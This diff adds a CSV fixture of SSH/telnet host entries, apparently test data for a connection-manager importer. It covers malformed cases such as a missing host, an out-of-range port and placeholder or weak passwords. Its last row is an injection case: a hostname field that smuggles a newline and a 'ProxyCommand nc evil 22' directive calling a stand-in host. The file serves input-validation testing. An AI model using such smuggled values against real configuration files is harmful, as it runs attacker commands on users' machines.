@@ -1,0 +1,11 @@
+﻿Groups,Label,Tags,Hostname/IP,Protocol,Port,Username,Password,SSH_KEY
+Production/EU,web eu 1,"web,nginx",203.0.113.10,ssh,22,deploy,,
+Production/EU,db-eu-1,"db,postgres",203.0.113.11,ssh,2222,postgres,FAKEPASS123,
+Production,AT 198.51.100.7,,198.51.100.7,ssh,38444,root,123456,SSH_KEY
+Staging,web eu 1,Web Serveur,staging.example.test,ssh,,ubuntu,,
+,legacy-switch,network,192.0.2.50,telnet,23,admin,,
+,v6-box,ipv6,2001:db8::10,ssh,22,ops,,
+,no-host,,,ssh,22,root,,
+Lab,bad-port,,192.0.2.60,ssh,70000,root,,
+Lab,inject,,"192.0.2.61
+ProxyCommand nc evil 22",ssh,22,root,,
